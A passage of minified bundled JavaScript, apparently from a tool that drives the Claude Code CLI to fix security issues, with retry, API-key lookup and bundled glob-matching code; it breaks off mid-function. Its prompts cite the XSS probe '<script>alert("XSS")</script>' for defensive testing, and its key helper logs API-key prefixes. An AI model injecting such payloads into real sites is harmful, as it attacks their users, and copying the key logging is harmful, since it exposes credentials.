B="",q="";W.stdout?.on("data",(Z)=>{let M=Z.toString();B+=M,V.debug(`Claude CLI stdout: ${M.slice(0,200)}`),process.stdout.write(M)}),W.stderr?.on("data",(Z)=>{let M=Z.toString();q+=M,process.stderr.write(M)}),W.on("close",(Z)=>{if(clearTimeout(Y),Z===0)J({success:!0,output:B});else J({success:!1,error:`Claude CLI exited with code ${Z}. stderr: ${q}`})}),W.on("error",(Z)=>{if($<H.length)V.debug(`Command ${U} failed with: ${Z.message}, trying next approach...`),z();else clearTimeout(Y),J({success:!1,error:`Failed to start Claude CLI: ${Z.message}`})})};z()})}getModifiedFiles(){try{let{execSync:X}=O0("child_process"),Q=X("git diff --name-only",{cwd:this.repoPath,encoding:"utf-8"}).trim();return Q?Q.split(`
`):[]}catch(X){return V.error("Failed to get modified files:",X),[]}}constructPrompt(X,Q){if(this.claudeConfig?.useStructuredPhases)return this.constructStructuredPhasedPrompt(X,Q);return`You are an expert security engineer fixing vulnerabilities using Test-Driven Development (TDD) methodology.

## Issue Details:
- **Title**: ${X.title}
- **Description**: ${X.body}
- **Complexity**: ${Q.complexity}
- **Files with vulnerabilities**: ${Q.relatedFiles?.join(", ")||"To be discovered"}

## CRITICAL: Use TDD Red-Green-Refactor Methodology

### Phase 1: RED - Prove the Vulnerability Exists
- Use Read to understand the vulnerable code
- Identify how the vulnerability can be exploited
- Document a test that WOULD exploit the vulnerability (e.g., for XSS: injecting '<script>alert("XSS")</script>')

### Phase 2: GREEN - Fix the Vulnerability
- Use Edit or MultiEdit tools to fix the security issue
- For XSS: Add proper HTML escaping/sanitization
- For SQL Injection: Use parameterized queries
- Make minimal changes that prevent the exploit

### Phase 3: REFACTOR - Ensure Quality
- Verify legitimate functionality still works
- Clean up the fix if needed
- Ensure no regressions were introduced

### Phase 4: Provide Fix Summary (ONLY AFTER EDITING FILES)
After completing the TDD cycle and editing files, provide this JSON:

\`\`\`json
{
  "title": "Fix [vulnerability type] in [component]",
  "description": "Clear explanation of what was vulnerable and how you fixed it",
  "files": [
    {
      "path": "path/to/file.js",
      "changes": "Complete fixed code content (use Read to get it if needed)"
    }
  ],
  "tests": [
    "RED test validates that malicious input like '<script>alert(\\"XSS\\")</script>' in [field] is properly escaped and cannot execute",
    "GREEN test ensures the fix prevents XSS by escaping dangerous characters in [field] input",
    "REFACTOR test confirms that valid [functionality] still works correctly and [feature] loads properly"
  ]
}
\`\`\`

Remember: Follow TDD - understand vulnerability (RED), fix it (GREEN), ensure quality (REFACTOR), THEN provide JSON.`}constructStructuredPhasedPrompt(X,Q){return`You are an expert security engineer using Test-Driven Development (TDD) to fix vulnerabilities.

## \uD83D\uDEA8 CRITICAL: FOLLOW TDD RED-GREEN-REFACTOR METHODOLOGY \uD83D\uDEA8

## PHASE 1: RED - UNDERSTAND THE VULNERABILITY

1. Locate the vulnerability: ${X.title}
   - Description: ${X.body}
   - Related files: ${Q.relatedFiles?.join(", ")||"To be discovered"}

2. Use Read to examine the vulnerable code

3. Identify the attack vector (e.g., for XSS: '<script>alert("XSS")</script>')

## PHASE 2: GREEN - FIX THE VULNERABILITY

1. Use Edit or MultiEdit tools to fix the vulnerable code
   - For XSS: Escape HTML entities (&, <, >, ", ')
   - For SQL Injection: Use parameterized queries
   - Make minimal changes that block the exploit

2. After editing, use Read tool to verify your fix

3. Say "GREEN PHASE COMPLETE: Vulnerability fixed" when done

## PHASE 3: REFACTOR - ENSURE QUALITY

1. Verify legitimate functionality still works
2. Clean up code if needed
3. Say "REFACTOR COMPLETE: Code quality verified"

## PHASE 4: JSON SUMMARY (ONLY AFTER ALL PHASES)

Provide this JSON with TDD test descriptions:

\`\`\`json
{
  "title": "Fix [vulnerability type] in [component]",
  "description": "Clear explanation using TDD: RED (vulnerability existed), GREEN (fix applied), REFACTOR (quality ensured)",
  "files": [
    {
      "path": "path/to/edited/file.js",
      "changes": "Complete file content after your edits (read it back with Read tool)"
    }
  ],
  "tests": [
    "RED test: Validates that malicious input like '<script>alert(\\"XSS\\")</script>' would have been exploitable before fix",
    "GREEN test: Ensures the fix prevents the vulnerability by properly escaping/sanitizing input",
    "REFACTOR test: Confirms legitimate functionality (e.g., livereload) still works correctly"
  ]
}
\`\`\`

## TDD Checklist:
 RED: Understood vulnerability and attack vector
 GREEN: Applied fix using Edit/MultiEdit tools
 REFACTOR: Verified no regressions
 Provided JSON with TDD test descriptions

Remember: Follow TDD methodology - RED (understand), GREEN (fix), REFACTOR (verify), then JSON.`}}var xI=$1(()=>{y1()});function fI(){return process.env.RSOLV_DEV_MODE==="true"||process.env.USE_CLAUDE_CODE_MAX==="true"}var lQ;var DK=$1(()=>{xI();y1();lQ=class lQ extends LK{defaultRetryConfig={maxAttempts:parseInt(process.env.RSOLV_RETRY_MAX_ATTEMPTS||"3"),initialDelayMs:parseInt(process.env.RSOLV_RETRY_INITIAL_DELAY_MS||"1000"),maxDelayMs:parseInt(process.env.RSOLV_RETRY_MAX_DELAY_MS||"30000"),backoffMultiplier:parseFloat(process.env.RSOLV_RETRY_BACKOFF_MULTIPLIER||"2"),retryableErrors:["rate_limit","overloaded","timeout","network","ECONNRESET","ETIMEDOUT","ENOTFOUND","EHOSTUNREACH","Claude CLI exited with code"]};async generateSolution(X,Q,J){try{V.info("Using RetryableClaudeCodeCLI for file editing...");let Y=fI(),W=await this.getApiKey(Y);if(!W)return{success:!1,message:"No API key available",error:Y?"Claude Code Max API key not configured for development mode. Set CLAUDE_CODE_MAX_API_KEY or ANTHROPIC_API_KEY":"No API key or vended credentials available"};process.env.ANTHROPIC_API_KEY=W,V.info(`Using ${Y?"Claude Code Max (dev)":"production"} API`);let G=J||this.constructPrompt(X,Q);V.info(`Working directory: ${this.repoPath}`),V.info(`Prompt length: ${G.length} characters`);let H=await this.executeWithRetry(G,{cwd:this.repoPath,env:{...process.env,ANTHROPIC_API_KEY:W}});if(!H.success)return H;let $=this.getModifiedFiles();if($.length===0)return{success:!1,message:"No files were modified by Claude Code CLI",error:"Claude Code CLI did not make any file changes"};V.info(`Files modified by Claude Code CLI: ${$.join(", ")}`);let z={};for(let U of $)z[U]="Modified by Claude Code CLI";return{success:!0,message:`Successfully modified ${$.length} file(s)`,changes:z}}catch(Y){return V.error("Failed to generate solution with retry:",Y),{success:!1,message:"Failed to generate solution",error:Y instanceof Error?Y.message:String(Y)}}}async executeWithRetry(X,Q,J){let Y={...this.defaultRetryConfig,...J},W=null;for(let G=1;G<=Y.maxAttempts;G++){try{V.info(`Attempt ${G}/${Y.maxAttempts}: Executing Claude Code CLI`);let H=await this.executeCLI(X,Q);if(H.success){if(G>1)V.info(`Succeeded on attempt ${G} after ${G-1} retry(ies)`);return{success:!0,message:H.output||"Operation completed successfully"}}if(!this.isRetryableError(H.error,Y.retryableErrors)){if(V.warn(`Non-retryable error: ${H.error}`),this.isAuthenticationError(H.error))this.logAuthenticationFailureDebugInfo();return{success:!1,message:H.error||"Operation failed",error:H.error}}W=Error(H.error||"Unknown error"),V.warn(`Retryable error on attempt ${G}: ${H.error}`)}catch(H){if(W=H,!this.isRetryableError(W.message,Y.retryableErrors))throw V.error(`Non-retryable exception: ${W.message}`),H;V.warn(`Retryable exception on attempt ${G}: ${W.message}`)}if(G<Y.maxAttempts){let H=Math.min(Y.initialDelayMs*Math.pow(Y.backoffMultiplier,G-1),Y.maxDelayMs);V.info(`Retrying in ${H}ms (exponential backoff)...`),await this.sleep(H)}}return V.error(`Failed after ${Y.maxAttempts} attempts. Last error: ${W?.message}`),{success:!1,message:`Failed after ${Y.maxAttempts} attempts`,error:W?.message||"Unknown error"}}isRetryableError(X,Q){if(!X)return!1;let J=X.toLowerCase();return Q.some((Y)=>J.includes(Y.toLowerCase()))}sleep(X){return new Promise((Q)=>setTimeout(Q,X))}async getApiKey(X){if(X){let Y=process.env.CLAUDE_CODE_MAX_API_KEY;if(Y)return V.debug("Using Claude Code Max API key from CLAUDE_CODE_MAX_API_KEY"),this.validateAndLogCredentialFormat(Y,"CLAUDE_CODE_MAX_API_KEY"),Y;let W=process.env.ANTHROPIC_API_KEY;if(W)return V.debug("Using regular API key in dev mode (CLAUDE_CODE_MAX_API_KEY not set)"),this.validateAndLogCredentialFormat(W,"ANTHROPIC_API_KEY"),W;return}let Q,J="unknown";if(this.credentialManager){V.info("Credential manager available, attempting to get Anthropic credentials");try{if(Q=await this.credentialManager.getCredential("anthropic"),V.info(`Got credential from manager: ${Q?"API key received (length: "+Q.length+")":"No API key returned"}`),Q)V.info("Using vended credentials for production mode"),J="vended"}catch(Y){V.warn("Failed to get vended credentials:",Y)}}else V.info("No credential manager available");if(!Q){if(Q=process.env.ANTHROPIC_API_KEY,Q)V.debug("Using environment ANTHROPIC_API_KEY"),J="environment"}if(Q)this.validateAndLogCredentialFormat(Q,J);return Q}validateAndLogCredentialFormat(X,Q){if(V.debug("Credential format validation starting..."),V.debug(`API key length: ${X.length}`),V.debug(`API key prefix: ${X.substring(0,Math.min(8,X.length))}...`),V.debug(`Credential source: ${Q}`),this.isValidAnthropicApiKeyFormat(X))V.debug("Credential format validation: PASSED - Valid Anthropic API key format detected");else if(V.warn("Credential format validation: FAILED - credential format may be incompatible with Claude CLI"),V.warn(`Expected format: sk-ant-api03-... but got prefix: ${X.substring(0,Math.min(12,X.length))}...`),X.startsWith("rsolv_"))V.warn("Credential validation: RSOLV vended format detected - may need conversion for Claude CLI compatibility");else if(X.length<20)V.warn("Credential validation: API key appears too short for Anthropic format");else V.warn("Credential validation: Unknown API key format - proceeding but authentication may fail");if(V.debug(`ANTHROPIC_API_KEY environment variable set: ${!!process.env.ANTHROPIC_API_KEY}`),process.env.ANTHROPIC_API_KEY&&process.env.ANTHROPIC_API_KEY!==X)V.debug("Note: Using different credential than ANTHROPIC_API_KEY environment variable")}isValidAnthropicApiKeyFormat(X){if(!X||typeof X!=="string")return!1;return/^sk-ant-api03-[A-Za-z0-9+/\-_]+=*$/.test(X)}isAuthenticationError(X){if(!X)return!1;let Q=X.toLowerCase();return Q.includes("invalid x-api-key")||Q.includes("authentication_error")||Q.includes("401")||Q.includes("unauthorized")||Q.includes("invalid api key")}logAuthenticationFailureDebugInfo(){V.debug("Authentication failed - credential debugging info:");let X=fI();if(X)V.debug("Credential source: development mode"),V.debug(`CLAUDE_CODE_MAX_API_KEY set: ${!!process.env.CLAUDE_CODE_MAX_API_KEY}`),V.debug(`ANTHROPIC_API_KEY set: ${!!process.env.ANTHROPIC_API_KEY}`);else V.debug("Credential source: vended"),V.debug(`Credential manager available: ${!!this.credentialManager}`);V.debug(`ANTHROPIC_API_KEY environment variable set: ${!!process.env.ANTHROPIC_API_KEY}`),V.debug(`Working directory: ${this.repoPath}`),V.debug(`Development mode: ${X}`),V.debug("Note: Claude CLI authentication differs from SDK - format validation may reveal incompatibilities")}}});var NK=(X,Q,J)=>{let Y=X instanceof RegExp?hI(X,J):X,W=Q instanceof RegExp?hI(Q,J):Q,G=Y!==null&&W!=null&&Js1(Y,W,J);return G&&{start:G[0],end:G[1],pre:J.slice(0,G[0]),body:J.slice(G[0]+Y.length,G[1]),post:J.slice(G[1]+W.length)}},hI=(X,Q)=>{let J=Q.match(X);return J?J[0]:null},Js1=(X,Q,J)=>{let Y,W,G,H=void 0,$,z=J.indexOf(X),U=J.indexOf(Q,z+1),K=z;if(z>=0&&U>0){if(X===Q)return[z,U];Y=[],G=J.length;while(K>=0&&!$){if(K===z)Y.push(K),z=J.indexOf(X,K+1);else if(Y.length===1){let B=Y.pop();if(B!==void 0)$=[B,U]}else{if(W=Y.pop(),W!==void 0&&W<G)G=W,H=U;U=J.indexOf(Q,K+1)}K=z<U&&z>=0?z:U}if(Y.length&&H!==void 0)$=[G,H]}return $};function wK(X){return!isNaN(X)?parseInt(X,10):X.charCodeAt(0)}function qs1(X){return X.replace(zs1,yI).replace(Us1,gI).replace(Ks1,IK).replace(Vs1,mI).replace(Bs1,uI)}function Zs1(X){return X.replace(Ys1,"\\").replace(Ws1,"{").replace(Gs1,"}").replace(Hs1,",").replace($s1,".")}function cI(X){if(!X)return[""];let Q=[],J=NK("{","}",X);if(!J)return X.split(",");let{pre:Y,body:W,post:G}=J,H=Y.split(",");H[H.length-1]+="{"+W+"}";let $=cI(G);if(G.length)H[H.length-1]+=$.shift(),H.push.apply(H,$);return Q.push.apply(Q,H),Q}function lI(X){if(!X)return[];if(X.slice(0,2)==="{}")X="\\{\\}"+X.slice(2);return pQ(qs1(X),!0).map(Zs1)}function Ms1(X){return"{"+X+"}"}function js1(X){return/^-?0\d/.test(X)}function Fs1(X,Q){return X<=Q}function Os1(X,Q){return X>=Q}function pQ(X,Q){let J=[],Y=NK("{","}",X);if(!Y)return[X];let W=Y.pre,G=Y.post.length?pQ(Y.post,!1):[""];if(/\$$/.test(Y.pre))for(let H=0;H<G.length;H++){let $=W+"{"+Y.body+"}"+G[H];J.push($)}else{let H=/^-?\d+\.\.-?\d+(?:\.\.-?\d+)?$/.test(Y.body),$=/^[a-zA-Z]\.\.[a-zA-Z](?:\.\.-?\d+)?$/.test(Y.body),z=H||$,U=Y.body.indexOf(",")>=0;if(!z&&!U){if(Y.post.match(/,(?!,).*\}/))return X=Y.pre+"{"+Y.body+IK+Y.post,pQ(X);return[X]}let K;if(z)K=Y.body.split(/\.\./);else if(K=cI(Y.body),K.length===1&&K[0]!==void 0){if(K=pQ(K[0],!1).map(Ms1),K.length===1)return G.map((q)=>Y.pre+K[0]+q)}let B;if(z&&K[0]!==void 0&&K[1]!==void 0){let q=wK(K[0]),Z=wK(K[1]),M=Math.max(K[0].length,K[1].length),L=K.length===3&&K[2]!==void 0?Math.abs(wK(K[2])):1,R=Fs1;if(Z<q)L*=-1,R=Os1;let F=K.some(js1);B=[];for(let A=q;R(A,Z);A+=L){let O;if($){if(O=String.fromCharCode(A),O==="\\")O=""}else if(O=String(A),F){let w=M-O.length;if(w>0){let N=Array(w+1).join("0");if(A<0)O="-"+N+O.slice(1);else O=N+O}}B.push(O)}}else{B=[];for(let q=0;q<K.length;q++)B.push.apply(B,pQ(K[q],!1))}for(let q=0;q<B.length;q++)for(let Z=0;Z<G.length;Z++){let M=W+B[q]+G[Z];if(!Q||z||M)J.push(M)}}return J}var yI,gI,IK,mI,uI,Ys1,Ws1,Gs1,Hs1,$s1,zs1,Us1,Ks1,Vs1,Bs1;var pI=$1(()=>{yI="\x00SLASH"+Math.random()+"\x00",gI="\x00OPEN"+Math.random()+"\x00",IK="\x00CLOSE"+Math.random()+"\x00",mI="\x00COMMA"+Math.random()+"\x00",uI="\x00PERIOD"+Math.random()+"\x00",Ys1=new RegExp(yI,"g"),Ws1=new RegExp(gI,"g"),Gs1=new RegExp(IK,"g"),Hs1=new RegExp(mI,"g"),$s1=new RegExp(uI,"g"),zs1=/\\\\/g,Us1=/\\{/g,Ks1=/\\}/g,Vs1=/\\,/g,Bs1=/\\./g});var dQ=(X)=>{if(typeof X!=="string")throw TypeError("invalid pattern");if(X.length>65536)throw TypeError("pattern is too long")};var As1,iQ=(X)=>X.replace(/[[\]\\-]/g,"\\$&"),Rs1=(X)=>X.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&"),dI=(X)=>X.join(""),iI=(X,Q)=>{let J=Q;if(X.charAt(J)!=="[")throw Error("not in a brace expression");let Y=[],W=[],G=J+1,H=!1,$=!1,z=!1,U=!1,K=J,B="";X:while(G<X.length){let L=X.charAt(G);if((L==="!"||L==="^")&&G===J+1){U=!0,G++;continue}if(L==="]"&&H&&!z){K=G+1;break}if(H=!0,L==="\\"){if(!z){z=!0,G++;continue}}if(L==="["&&!z){for(let[R,[j,F,A]]of Object.entries(As1))if(X.startsWith(R,G)){if(B)return["$.",!1,X.length-J,!0];if(G+=R.length,A)W.push(j);else Y.push(j);$=$||F;continue X}}if(z=!1,B){if(L>B)Y.push(iQ(B)+"-"+iQ(L));else if(L===B)Y.push(iQ(L));B="",G++;continue}if(X.startsWith("-]",G+1)){Y.push(iQ(L+"-")),G+=2;continue}if(X.startsWith("-",G+1)){B=L,G+=2;continue}Y.push(iQ(L)),G++}if(K<G)return["",!1,0,!1];if(!Y.length&&!W.length)return["$.",!1,X.length-J,!0];if(W.length===0&&Y.length===1&&/^\\?.$/.test(Y[0])&&!U){let L=Y[0].length===2?Y[0].slice(-1):Y[0];return[Rs1(L),!1,K-J,!1]}let q="["+(U?"^":"")+dI(Y)+"]",Z="["+(U?"":"^")+dI(W)+"]";return[Y.length&&W.length?"("+q+"|"+Z+")":Y.length?q:Z,$,K-J,!0]};var rI=$1(()=>{As1={"[:alnum:]":["\\p{L}\\p{Nl}\\p{Nd}",!0],"[:alpha:]":["\\p{L}\\p{Nl}",!0],"[:ascii:]":["\\x00-\\x7f",!1],"[:blank:]":["\\p{Zs}\\t",!0],"[:cntrl:]":["\\p{Cc}",!0],"[:digit:]":["\\p{Nd}",!0],"[:graph:]":["\\p{Z}\\p{C}",!0,!0],"[:lower:]":["\\p{Ll}",!0],"[:print:]":["\\p{C}",!0],"[:punct:]":["\\p{P}",!0],"[:space:]":["\\p{Z}\\t\\r\\n\\v\\f",!0],"[:upper:]":["\\p{Lu}",!0],"[:word:]":["\\p{L}\\p{Nl}\\p{Nd}\\p{Pc}",!0],"[:xdigit:]":["A-Fa-f0-9",!1]}});var f6=(X,{windowsPathsNoEscape:Q=!1}={})=>{return Q?X.replace(/\[([^\/\\])\]/g,"$1"):X.replace(/((?!\\).|^)\[([^\/\\])\]/g,"$1$2").replace(/\\([^\/])/g,"$1")};class Z9{type;#X;#Q;#G=!1;#W=[];#H;#R;#O;#K=!1;#$;#B;#V=!1;constructor(X,Q,J={}){if(this.type=X,X)this.#Q=!0;if(this.#H=Q,this.#X=this.#H?this.#H.#X:this,this.#$=this.#X===this?J:this.#X.#$,this.#O=this.#X===this?[]:this.#X.#O,X==="!"&&!this.#X.#K)this.#O.push(this);this.#R=this.#H?this.#H.#W.length:0}get hasMagic(){if(this.#Q!==void 0)return this.#Q;for(let X of this.#W){if(typeof X==="string")continue;if(X.type||X.hasMagic)return this.#Q=!0}return this.#Q}toString(){if(this.#B!==void 0)return this.#B;if(!this.type)return this.#B=this.#W.map((X)=>String(X)).join("");else return this.#B=this.type+"("+this.#W.map((X)=>String(X)).join("|")+")"}#z(){if(this!==this.#X)throw Error("should only call on root");if(this.#K)return this;this.toString(),this.#K=!0;let X;while(X=this.#O.pop()){if(X.type!=="!")continue;let Q=X,J=Q.#H;while(J){for(let Y=Q.#R+1;!J.type&&Y<J.#W.length;Y++)for(let W of X.#W){if(typeof W==="string")throw Error("string part in extglob AST??");W.copyIn(J.#W[Y])}Q=J,J=Q.#H}}return this}push(...X){for(let Q of X){if(Q==="")continue;if(typeof Q!=="string"&&!(Q instanceof Z9&&Q.#H===this))throw Error("invalid part: "+Q);this.#W.push(Q)}}toJSON(){let X=this.type===null?this.#W.slice().map((Q)=>typeof Q==="string"?Q:Q.toJSON()):[this.type,...this.#W.map((Q)=>Q.toJSON())];if(this.isStart()&&!this.type)X.unshift([]);if(this.isEnd()&&(this===this.#X||this.#X.#K&&this.#H?.type==="!"))X.push({});return X}isStart(){if(this.#X===this)return!0;if(!this.#H?.isStart())return!1;if(this.#R===0)return!0;let X=this.#H;for(let Q=0;Q<this.#R;Q++){let J=X.#W[Q];if(!(J instanceof Z9&&J.type==="!"))return!1}return!0}isEnd(){if(this.#X===this)return!0;if(this.#H?.type==="!")return!0;if(!this.#H?.isEnd())return!1;if(!this.type)return this.#H?.isEnd();let X=this.#H?this.#H.#W.length:0;return this.#R===X-1}copyIn(X){if(typeof X==="string")this.push(X);else this.push(X.clone(this))}clone(X){let Q=new Z9(this.type,X);for(let J of this.#W)Q.copyIn(J);return Q}static#J(X,Q,J,Y){let W=!1,G=!1,H=-1,$=!1;if(Q.type===null){let q=J,Z="";while(q<X.length){let M=X.charAt(q++);if(W||M==="\\"){W=!W,Z+=M;continue}if(G){if(q===H+1){if(M==="^"||M==="!")$=!0}else if(M==="]"&&!(q===H+2&&$))G=!1;Z+=M;continue}else if(M==="["){G=!0,H=q,$=!1,Z+=M;continue}if(!Y.noext&&nI(M)&&X.charAt(q)==="("){Q.push(Z),Z="";let L=new Z9(M,Q);q=Z9.#J(X,L,q,Y),Q.push(L);continue}Z+=M}return Q.push(Z),q}let z=J+1,U=new Z9(null,Q),K=[],B="";while(z<X.length){let q=X.charAt(z++);if(W||q==="\\"){W=!W,B+=q;continue}if(G){if(z===H+1){if(q==="^"||q==="!")$=!0}else if(q==="]"&&!(z===H+2&&$))G=!1;B+=q;continue}else if(q==="["){G=!0,H=z,$=!1,B+=q;continue}if(nI(q)&&X.charAt(z)==="("){U.push(B),B="";let Z=new Z9(q,U);U.push(Z),z=Z9.#J(X,Z,z,Y);continue}if(q==="|"){U.push(B),B="",K.push(U),U=new Z9(null,Q);continue}if(q===")"){if(B===""&&Q.#W.length===0)Q.#V=!0;return U.push(B),B="",Q.push(...K,U),z}B+=q}return Q.type=null,Q.#Q=void 0,Q.#W=[X.substring(J-1)],z}static fromGlob(X,Q={}){let J=new Z9(null,void 0,Q);return Z9.#J(X,J,0,Q),J}toMMPattern(){if(this!==this.#X)return this.#X.toMMPattern();let X=this.toString(),[Q,J,Y,W]=this.toRegExpSource();if(!(Y||this.#Q||this.#$.nocase&&!this.#$.nocaseMagicOnly&&X.toUpperCase()!==X.toLowerCase()))return J;let H=(this.#$.nocase?"i":"")+(W?"u":"");return Object.assign(new RegExp(`^${Q}$`,H),{_src:Q,_glob:X})}get options(){return this.#$}toRegExpSource(X){let Q=X??!!this.#$.dot;if(this.#X===this)this.#z();if(!this.type){let $=this.isStart()&&this.isEnd(),z=this.#W.map((q)=>{let[Z,M,L,R]=typeof q==="string"?Z9.#L(q,this.#Q,$):q.toRegExpSource(X);return this.#Q=this.#Q||L,this.#G=this.#G||R,Z}).join(""),U="";if(this.isStart()){if(typeof this.#W[0]==="string"){if(!(this.#W.length===1&&ws1.has(this.#W[0]))){let Z=Ns1,M=Q&&Z.has(z.charAt(0))||z.startsWith("\\.")&&Z.has(z.charAt(2))||z.startsWith("\\.\\.")&&Z.has(z.charAt(4)),L=!Q&&!X&&Z.has(z.charAt(0));U=M?Ds1:L?fW:""}}}let K="";if(this.isEnd()&&this.#X.#K&&this.#H?.type==="!")K="(?:$|\\/)";return[U+z+K,f6(z),this.#Q=!!this.#Q,this.#G]}let J=this.type==="*"||this.type==="+",Y=this.type==="!"?"(?:(?!(?:":"(?:",W=this.#Z(Q);if(this.isStart()&&this.isEnd()&&!W&&this.type!=="!"){let $=this.toString();return this.#W=[$],this.type=null,this.#Q=void 0,[$,f6(this.toString()),!1,!1]}let G=!J||X||Q||!fW?"":this.#Z(!0);if(G===W)G="";if(G)W=`(?:${W})(?:${G})*?`;let H="";if(this.type==="!"&&this.#V)H=(this.isStart()&&!Q?fW:"")+oI;else{let $=this.type==="!"?"))"+(this.isStart()&&!Q&&!X?fW:"")+aI+")":this.type==="@"?")":this.type==="?"?")?":this.type==="+"&&G?")":this.type==="*"&&G?")?":`)${this.type}`;H=Y+W+$}return[H,f6(W),this.#Q=!!this.#Q,this.#G]}#Z(X){return this.#W.map((Q)=>{if(typeof Q==="string")throw Error("string type in extglob ast??");let[J,Y,W,G]=Q.toRegExpSource(X);return this.#G=this.#G||G,J}).filter((Q)=>!(this.isStart()&&this.isEnd())||!!Q).join("|")}static#L(X,Q,J=!1){let Y=!1,W="",G=!1;for(let H=0;H<X.length;H++){let $=X.charAt(H);if(Y){Y=!1,W+=(Is1.has($)?"\\":"")+$;continue}if($==="\\"){if(H===X.length-1)W+="\\\\";else Y=!0;continue}if($==="["){let[z,U,K,B]=iI(X,H);if(K){W+=z,G=G||U,H+=K-1,Q=Q||B;continue}}if($==="*"){if(J&&X==="*")W+=oI;else W+=aI;Q=!0;continue}if($==="?"){W+=CK,Q=!0;continue}W+=Cs1($)}return[W,f6(X),!!Q,G]}}var Ls1,nI=(X)=>Ls1.has(X),Ds1="(?!(?:^|/)\\.\\.?(?:$|/))",fW="(?!\\.)",Ns1,ws1,Is1,Cs1=(X)=>X.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&"),CK="[^/]",aI,oI;var PK=$1(()=>{rI();Ls1=new Set(["!","?","+","*","@"]),Ns1=new Set(["[","."]),ws1=new Set(["..","."]),Is1=new Set("().*{}+?[]^$\\!"),aI=CK+"*?",oI=CK+"+?"});var l5=(X,{windowsPathsNoEscape:Q=!1}={})=>{return Q?X.replace(/[?*()[\]]/g,"[$&]"):X.replace(/[?*()[\]\\]/g,"\\$&")};class q6{options;set;pattern;windowsPathsNoEscape;nonegate;negate;comment;empty;preserveMultipleSlashes;partial;globSet;globParts;nocase;isWindows;platform;windowsNoMagicRoot;regexp;constructor(X,Q={}){if(dQ(X),Q=Q||{},this.options=Q,this.pattern=X,this.platform=Q.platform||QC,this.isWindows=this.platform==="win32",this.windowsPathsNoEscape=!!Q.windowsPathsNoEscape||Q.allowWindowsEscape===!1,this.windowsPathsNoEscape)this.pattern=this.pattern.replace(/\\/g,"/");this.preserveMultipleSlashes=!!Q.preserveMultipleSlashes,this.regexp=null,this.negate=!1,this.nonegate=!!Q.nonegate,this.comment=!1,this.empty=!1,this.partial=!!Q.partial,this.nocase=!!this.options.nocase,this.windowsNoMagicRoot=Q.windowsNoMagicRoot!==void 0?Q.windowsNoMagicRoot:!!(this.isWindows&&this.nocase),this.globSet=[],this.globParts=[],this.set=[],this.make()}hasMagic(){if(this.options.magicalBraces&&this.set.length>1)return!0;for(let X of this.set)for(let Q of X)if(typeof Q!=="string")return!0;return!1}debug(...X){}make(){let X=this.pattern,Q=this.options;if(!Q.nocomment&&X.charAt(0)==="#"){this.comment=!0;return}if(!X){this.empty=!0;return}if(this.parseNegate(),this.globSet=[...new Set(this.braceExpand())],Q.debug)this.debug=(...W)=>console.error(...W);this.debug(this.pattern,this.globSet);let J=this.globSet.map((W)=>this.slashSplit(W));this.globParts=this.preprocess(J),this.debug(this.pattern,this.globParts);let Y=this.globParts.map((W,G,H)=>{if(this.isWindows&&this.windowsNoMagicRoot){let $=W[0]===""&&W[1]===""&&(W[2]==="?"||!tI.test(W[2]))&&!tI.test(W[3]),z=/^[a-z]:/i.test(W[0]);if($)return[...W.slice(0,4),...W.slice(4).map((U)=>this.parse(U))];else if(z)return[W[0],...W.slice(1).map((U)=>this.parse(U))]}return W.map(($)=>this.parse($))});if(this.debug(this.pattern,Y),this.set=Y.filter((W)=>W.indexOf(!1)===-1),this.isWindows)for(let W=0;W<this.set.length;W++){let G=this.set[W];if(G[0]===""&&G[1]===""&&this.globParts[W][2]==="?"&&typeof G[3]==="string"&&/^[a-z]:$/i.test(G[3]))G[2]="?"}this.debug(this.pattern,this.set)}preprocess(X){if(this.options.noglobstar){for(let J=0;J<X.length;J++)for(let Y=0;Y<X[J].length;Y++)if(X[J][Y]==="**")X[J][Y]="*"}let{optimizationLevel:Q=1}=this.options;if(Q>=2)X=this.firstPhasePreProcess(X),X=this.secondPhasePreProcess(X);else if(Q>=1)X=this.levelOneOptimize(X);else X=this.adjascentGlobstarOptimize(X);return X}adjascentGlobstarOptimize(X){return X.map((Q)=>{let J=-1;while((J=Q.indexOf("**",J+1))!==-1){let Y=J;while(Q[Y+1]==="**")Y++;if(Y!==J)Q.splice(J,Y-J)}return Q})}levelOneOptimize(X){return X.map((Q)=>{return Q=Q.reduce((J,Y)=>{let W=J[J.length-1];if(Y==="**"&&W==="**")return J;if(Y===".."){if(W&&W!==".."&&W!=="."&&W!=="**")return J.pop(),J}return J.push(Y),J},[]),Q.length===0?[""]:Q})}levelTwoFileOptimize(X){if(!Array.isArray(X))X=this.slashSplit(X);let Q=!1;do{if(Q=!1,!this.preserveMultipleSlashes){for(let Y=1;Y<X.length-1;Y++){let W=X[Y];if(Y===1&&W===""&&X[0]==="")continue;if(W==="."||W==="")Q=!0,X.splice(Y,1),Y--}if(X[0]==="."&&X.length===2&&(X[1]==="."||X[1]===""))Q=!0,X.pop()}let J=0;while((J=X.indexOf("..",J+1))!==-1){let Y=X[J-1];if(Y&&Y!=="."&&Y!==".."&&Y!=="**")Q=!0,X.splice(J-1,2),J-=2}}while(Q);return X.length===0?[""]:X}firstPhasePreProcess(X){let Q=!1;do{Q=!1;for(let J of X){let Y=-1;while((Y=J.indexOf("**",Y+1))!==-1){let G=Y;while(J[G+1]==="**")G++;if(G>Y)J.splice(Y+1,G-Y);let H=J[Y+1],$=J[Y+2],z=J[Y+3];if(H!=="..")continue;if(!$||$==="."||$===".."||!z||z==="."||z==="..")continue;Q=!0,J.splice(Y,1);let U=J.slice(0);U[Y]="**",X.push(U),Y--}if(!this.preserveMultipleSlashes){for(let G=1;G<J.length-1;G++){let H=J[G];if(G===1&&H===""&&J[0]==="")continue;if(H==="."||H==="")Q=!0,J.splice(G,1),G--}if(J[0]==="."&&J.length===2&&(J[1]==="."||J[1]===""))Q=!0,J.pop()}let W=0;while((W=J.indexOf("..",W+1))!==-1){let G=J[W-1];if(G&&G!=="."&&G!==".."&&G!=="**"){Q=!0;let $=W===1&&J[W+1]==="**"?["."]:[];if(J.splice(W-1,2,...$),J.length===0)J.push("");W-=2}}}}while(Q);return X}secondPhasePreProcess(X){for(let Q=0;Q<X.length-1;Q++)for(let J=Q+1;J<X.length;J++){let Y=this.partsMatch(X[Q],X[J],!this.preserveMultipleSlashes);if(Y){X[Q]=[],X[J]=Y;break}}return X.filter((Q)=>Q.length)}partsMatch(X,Q,J=!1){let Y=0,W=0,G=[],H="";while(Y<X.length&&W<Q.length)if(X[Y]===Q[W])G.push(H==="b"?Q[W]:X[Y]),Y++,W++;else 